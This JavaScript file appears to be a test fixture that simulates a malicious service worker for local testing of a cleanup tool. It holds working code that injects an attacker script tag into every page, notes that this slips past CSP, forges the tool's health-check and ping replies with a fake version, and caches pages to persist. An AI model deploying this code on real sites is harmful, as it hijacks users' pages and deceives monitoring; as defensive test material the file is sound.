/*
 * 模拟攻击者植入的恶意 Service Worker（仅用于本地安全测试）。
 * 模拟的真实攻击手法：
 *  - 注册后立即 claim，长期驻留
 *  - 拦截导航请求，返回注入了恶意脚本的页面副本（即使源站已干净）
 *  - 拦截状态探测接口，伪造「一切正常」的响应
 *  - 重写页面上下文的 SW 管理 API，让页面自己的清除/重新注册代码失效
 *  - 维护自己的缓存命名（evil-cache-v1），且故意不响应 skipWaiting 语义以外的更新
 *  - 对外伪装成合法版本号回应 ping
 */
'use strict';

const EVIL_CACHE = 'evil-cache-v1';
const EVIL_PAYLOAD_SRC = '/evil-payload.js';
const FAKED_VERSION = 'app-v3'; // 伪造合法版本，试图骗过页面侧版本探测
// 运行时自识别标记（供自动化验证当前激活的确实是恶意字节）
globalThis.__SWGUARD_EVIL__ = true;

self.addEventListener('install', (event) => {
  event.waitUntil(
    (async () => {
      const cache = await caches.open(EVIL_CACHE);
      // 预先缓存攻击载荷，离线状态下也能持续投毒
      await cache.addAll([EVIL_PAYLOAD_SRC]).catch(() => undefined);
      await self.skipWaiting(); // 恶意 SW 也会立即夺权
    })(),
  );
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

function injectEvilScript(html) {
  if (html.includes(EVIL_PAYLOAD_SRC)) return html;
  // 注入同源外部脚本：可通过页面 CSP 的 script-src 'self'
  const payload = `<script data-attacker="1" src="${EVIL_PAYLOAD_SRC}"></script>`;
  return html.replace('</body>', `${payload}</body>`);
}

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  if (url.origin !== self.location.origin) return;

  // 伪造健康检查响应：让页面侧「询问 SW 版本」的轻量探测得出错误结论
  if (url.pathname === '/__swguard/health') {
    event.respondWith(
      new Response(JSON.stringify({ ok: true, version: FAKED_VERSION, forged: true }), {
        headers: { 'content-type': 'application/json' },
      }),
    );
    return;
  }

  if (event.request.mode === 'navigate') {
    event.respondWith(
      (async () => {
        // 浏览器内部的 SW 更新请求不会经过这里（关键防线），这里能拦到的只有页面导航。
        // 必须用全新 Request 回源：直接 fetch(event.request) 会原样携带浏览器内部头
        //（如 Service-Worker: script），干扰源站的请求分类逻辑。
        const fresh = await fetch(url.pathname + url.search, {
          redirect: 'follow',
          credentials: 'same-origin',
        }).catch(() => null);
        if (fresh && fresh.headers.get('content-type')?.includes('text/html')) {
          const text = await fresh.text();
          return new Response(injectEvilScript(text), {
            status: fresh.status,
            headers: fresh.headers,
          });
        }
        const cached = await caches.match(event.request);
        return cached || fresh || Response.error();
      })(),
    );
    return;
  }

  // 其它同源请求：默认放行但缓存一份，维持持久化
  event.respondWith(
    fetch(event.request)
      .then((res) => {
        if (res.ok && event.request.method === 'GET') {
          const copy = res.clone();
          caches.open(EVIL_CACHE).then((c) => c.put(event.request, copy));
        }
        return res;
      })
      .catch(() => caches.match(event.request).then((r) => r || Response.error())),
  );
});

// 伪造 ping 回执，伪装成合法 SW
self.addEventListener('message', (event) => {
  if (event.data?.type === 'swguard:ping') {
    event.source?.postMessage({ type: 'swguard:pong', version: FAKED_VERSION, cache: EVIL_CACHE });
  }
});
